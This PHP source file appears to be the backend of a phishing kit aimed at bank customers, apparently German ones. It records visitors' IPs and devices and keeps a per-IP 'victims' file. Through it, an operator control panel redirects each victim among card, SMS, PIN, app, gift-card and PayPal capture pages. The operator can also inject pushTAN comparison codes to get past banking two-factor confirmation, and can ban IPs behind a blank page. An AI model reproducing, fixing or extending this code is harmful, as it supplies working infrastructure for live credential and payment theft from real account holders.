<?php

    // Start session if not already started
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }

    // error_reporting(0);

    require_once 'detect.php';
    
    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function visitors() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $date           = date("Y-m-d H:i:s", time());
        $usragent       = $_SERVER['HTTP_USER_AGENT'];
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Desktop';
        $platformName   = $detect->getPlatform();
        
        // Check if bot
        $isBot = $detect->isRobot() ? 'Yes' : 'No';
        
        // Check if proxy (common proxy headers)
        $isProxy = 'No';
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) || 
            !empty($_SERVER['HTTP_X_REAL_IP']) || 
            !empty($_SERVER['HTTP_VIA']) || 
            !empty($_SERVER['HTTP_PROXY_CONNECTION'])) {
            $isProxy = 'Yes';
        }
        
        // Get country from IP
        $country = 'Unknown';
        $countryCode = 'XX';
        $flagEmoji = '🌐';
        $api_url = "http://ip-api.com/json/{$ip}?fields=countryCode,country";
        $response = @file_get_contents($api_url);
        if ($response) {
            $ip_data = json_decode($response, true);
            if (isset($ip_data['countryCode'])) {
                $countryCode = $ip_data['countryCode'];
                $country = $ip_data['country'];
                // Convert country code to flag emoji
                $flagOffset = 0x1F1E6;
                $asciiOffset = 0x41;
                $firstChar = ord($countryCode[0]) - $asciiOffset + $flagOffset;
                $secondChar = ord($countryCode[1]) - $asciiOffset + $flagOffset;
                $flagEmoji = mb_chr($firstChar, 'UTF-8') . mb_chr($secondChar, 'UTF-8');
            }
        }
        
        // Store visitor data as JSON
        $visitor_data = array(
            'ip' => $ip,
            'date' => $date,
            'country' => $country,
            'flag' => $flagEmoji,
            'bot' => $isBot,
            'proxy' => $isProxy,
            'device' => $isMobile,
            'platform' => $platformName,
            'browser' => $browserName . ' ' . $browserVer,
            'user_agent' => $usragent
        );
        
        $visitor_file = __DIR__ . '/visitors.json';
        $visitors = array();
        
        if (file_exists($visitor_file)) {
            $existing = @json_decode(@file_get_contents($visitor_file), true);
            if (is_array($existing)) {
                $visitors = $existing;
            }
        }
        
        // Add new visitor (keep last 500)
        $visitors[] = $visitor_data;
        $visitors = array_slice($visitors, -500);
        
        file_put_contents($visitor_file, json_encode($visitors), LOCK_EX);
    }

    function get_steps_link() {
        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x = pathinfo($url);
        // Go up one directory level and then into panel
        $baseDir = dirname($x['dirname']);
        return $ee = $baseDir . '/panel/control.php?ip=' . get_client_ip();
    }
    
    // NEW SYSTEM: Using JSON with timestamps
    function get_victim_file_path($ip = null) {
        if ($ip === null) {
            $ip = get_client_ip();
        }
        $dir = __DIR__ . '/victims';
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        return $dir . '/' . $ip . '.json';
    }
    
    // Reset data when user submits a form - records the submit time
    function reset_data() {
        $file = get_victim_file_path();
        $data = array(
            'command' => 'waiting',
            'submit_time' => time(),
            'redirect_time' => 0
        );
        file_put_contents($file, json_encode($data));
    }
    
    // Admin sets redirect command - records the redirect time
    function set_redirect($ip, $command) {
        $file = get_victim_file_path($ip);
        
        // Read existing data (CRITICAL: preserve ALL existing data including pushtan_value)
        $data = array(
            'command' => 'waiting',
            'submit_time' => 0,
            'redirect_time' => 0,
            'page_history' => array()
        );
        
        if (file_exists($file)) {
            $existing = @json_decode(@file_get_contents($file), true);
            if (is_array($existing)) {
                // Preserve ALL existing data - don't overwrite pushtan_value or pushtan_time
                $data = $existing;
            }
        }
        
        // Initialize page_history if not exists
        if (!isset($data['page_history']) || !is_array($data['page_history'])) {
            $data['page_history'] = array();
        }
        
        // Save current page to history before changing (if different from new command)
        if (isset($data['current_page']) && !empty($data['current_page']) && $data['current_page'] !== $command) {
            // Add to history (keep last 10 pages)
            array_unshift($data['page_history'], $data['current_page']);
            $data['page_history'] = array_slice($data['page_history'], 0, 10);
        }
        
        // Save previous command
        if (isset($data['command']) && $data['command'] !== $command) {
            $data['previous_command'] = $data['command'];
        }
        
        // Update with new command and time (preserve pushtan_value and pushtan_time)
        $data['command'] = $command;
        $data['redirect_time'] = time() + 1; // Add 1 second to ensure it's always newer
        
        // For ban command, force it to work even without submit_time
        if ($command === 'ban') {
            $data['submit_time'] = 0;
        }
        
        // Use LOCK_EX to prevent file corruption
        @file_put_contents($file, json_encode($data), LOCK_EX);
    }
    
    // Get previous page from history
    function get_previous_page($ip) {
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return 'waiting';
        }
        
        $data = @json_decode(@file_get_contents($file), true);
        
        if (!is_array($data)) {
            return 'waiting';
        }
        
        // Check page history first
        if (isset($data['page_history']) && is_array($data['page_history']) && count($data['page_history']) > 0) {
            return $data['page_history'][0];
        }
        
        // Fallback to previous command
        if (isset($data['previous_command']) && !empty($data['previous_command'])) {
            return $data['previous_command'];
        }
        
        return 'waiting';
    }
    
    // Force ban a victim - always works
    function ban_victim($ip) {
        $file = get_victim_file_path($ip);
        $data = array(
            'command' => 'ban',
            'submit_time' => 0,
            'redirect_time' => time() + 1
        );
        file_put_contents($file, json_encode($data));
    }
    
    // Set pushTAN comparison value for a victim
    function set_pushtan_value($ip, $value) {
        $file = get_victim_file_path($ip);
        
        // Read existing data to preserve all existing fields
        $data = array(
            'command' => 'waiting',
            'submit_time' => 0,
            'redirect_time' => 0
        );
        
        if (file_exists($file)) {
            $existing = @json_decode(@file_get_contents($file), true);
            if (is_array($existing)) {
                $data = $existing;
            }
        }
        
        // Sanitize value (only alphanumeric, max 4 characters)
        $value = preg_replace('/[^A-Z0-9]/', '', strtoupper($value));
        $value = substr($value, 0, 4);
        
        // Update comparison value (preserve all other data)
        $data['pushtan_value'] = $value;
        $data['pushtan_time'] = time();
        
        // Write to file with lock to prevent corruption
        $result = @file_put_contents($file, json_encode($data), LOCK_EX);
        
        // Return the value that was saved for verification
        return $result !== false ? $value : false;
    }
    
    // Get pushTAN comparison value for a victim
    function get_pushtan_value($ip = null) {
        if ($ip === null) {
            $ip = get_client_ip();
        }
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return null;
        }
        
        $data = @json_decode(@file_get_contents($file), true);
        
        if (!is_array($data)) {
            return null;
        }
        
        // Check if pushtan_value exists and is not empty
        if (!isset($data['pushtan_value']) || empty($data['pushtan_value']) || strlen($data['pushtan_value']) !== 4) {
            return null;
        }
        
        // Return value if it's less than 10 minutes old (600 seconds) - extended time
        if (isset($data['pushtan_time']) && (time() - $data['pushtan_time']) < 600) {
            return $data['pushtan_value'];
        }
        
        // Return null if expired
        return null;
    }
    
    // Check if there's a valid redirect (redirect_time > submit_time)
    function get_redirect_command($ip = null) {
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return 'waiting';
        }
        
        $data = @json_decode(@file_get_contents($file), true);
        
        if (!is_array($data)) {
            return 'waiting';
        }
        
        // Ban command always works immediately
        if (isset($data['command']) && $data['command'] === 'ban') {
            return 'ban';
        }
        
        // Admin-initiated commands (like pushtan) always work immediately
        // These are set by the control panel, not by form submissions
        if (isset($data['command']) && $data['command'] === 'pushtan') {
            // Check if pushtan_value exists and is valid
            if (isset($data['pushtan_value']) && !empty($data['pushtan_value']) && strlen($data['pushtan_value']) === 4) {
                // Check if it's not expired (less than 10 minutes old)
                if (isset($data['pushtan_time']) && (time() - $data['pushtan_time']) < 600) {
                    return 'pushtan';
                }
            }
        }
        
        // Check if redirect command exists
        if (!isset($data['command']) || empty($data['command'])) {
            return 'waiting';
        }
        
        // Only return command if redirect was set AFTER submit
        // If submit_time is 0 (no form submitted yet), allow redirect
        if (isset($data['redirect_time'])) {
            $submit_time = isset($data['submit_time']) ? $data['submit_time'] : 0;
            if ($data['redirect_time'] > $submit_time) {
                return $data['command'];
            }
        }
        
        return 'waiting';
    }
    
    // Get current status for control panel
    function get_victim_status($ip) {
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return 'NO DATA';
        }
        
        $data = json_decode(file_get_contents($file), true);
        
        if (!is_array($data)) {
            return 'ERROR';
        }
        
        // Ban always shows immediately
        if (isset($data['command']) && $data['command'] === 'ban') {
            return 'BANNED';
        }
        
        // Check if victim is online (heartbeat within last 10 seconds)
        $last_heartbeat = isset($data['last_heartbeat']) ? $data['last_heartbeat'] : 0;
        $is_online = (time() - $last_heartbeat) < 10;
        
        // If online, show current page as status
        if ($is_online && isset($data['current_page']) && !empty($data['current_page'])) {
            return strtoupper($data['current_page']);
        }
        
        // Otherwise show command
        if (isset($data['redirect_time']) && $data['redirect_time'] > $data['submit_time']) {
            return strtoupper($data['command']);
        }
        
        return 'WAITING';
    }
    
    // Check if IP is banned - returns true if banned, false otherwise
    function is_ip_banned($ip = null) {
        if ($ip === null) {
            $ip = get_client_ip();
        }
        
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return false;
        }
        
        $data = @json_decode(@file_get_contents($file), true);
        
        if (!is_array($data)) {
            return false;
        }
        
        // Check if victim is banned
        if (isset($data['command']) && $data['command'] === 'ban') {
            return true;
        }
        
        return false;
    }
    
    // Check ban status and show blank page if banned
    function checkBanStatus() {
        $ip = get_client_ip();
        if (is_ip_banned($ip)) {
            // Show blank page
            exit;
        }
    }
    
    // Update heartbeat and current page for tracking
    function update_tracking($page) {
        $ip = get_client_ip();
        $file = get_victim_file_path($ip);
        
        // Read existing data
        $data = array();
        if (file_exists($file)) {
            $existing = @json_decode(@file_get_contents($file), true);
            if (is_array($existing)) {
                $data = $existing;
            }
        }
        
        // Update heartbeat and current page
        $data['last_heartbeat'] = time();
        $data['current_page'] = $page;
        
        // Initialize other fields if not set
        if (!isset($data['command'])) $data['command'] = 'waiting';
        if (!isset($data['submit_time'])) $data['submit_time'] = 0;
        if (!isset($data['redirect_time'])) $data['redirect_time'] = 0;
        
        @file_put_contents($file, json_encode($data), LOCK_EX);
    }
    
    // Get last saved page for returning visitors
    function get_last_page($ip = null) {
        if ($ip === null) {
            $ip = get_client_ip();
        }
        $file = get_victim_file_path($ip);
        
        if (!file_exists($file)) {
            return null;
        }
        
        $data = @json_decode(@file_get_contents($file), true);
        
        if (!is_array($data)) {
            return null;
        }
        
        // Check if visitor was on a specific page before
        if (isset($data['current_page']) && !empty($data['current_page'])) {
            $page = $data['current_page'];
            // Only return meaningful pages (not login, loading, or payment select)
            if (in_array($page, ['card', 'sms', 'sms2', 'pin', 'app', 'gift', 'paypal', 'waiting', 'card_error'])) {
                return $page;
            }
        }
        
        return null;
    }

